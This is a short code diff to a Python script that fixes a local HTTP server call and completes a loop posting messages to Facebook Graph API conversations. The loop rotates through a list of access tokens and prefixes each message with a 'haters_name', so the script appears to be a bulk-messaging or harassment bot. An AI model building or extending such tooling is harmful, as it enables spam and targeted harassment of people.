@@ -29,7 +29,7 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
 def execute_server():
       PORT = 4000
 
-      with TCPServer(("", PORT), MyHandler) as httpd:
+      with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
           print("Server running at http://localhost:{}".format(PORT))
           httpd.serve_forever()
 
@@ -111,7 +111,10 @@ def send_messages_from_file():
           try:
               for message_index in range(num_messages):
                   token_index = message_index % max_tokens
-                  
+                  access_token = tokens[token_index].strip()
+
+                  message = messages[message_index].strip()
+
                   url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
                   parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                   response = requests.post(url, json=parameters, headers=headers)
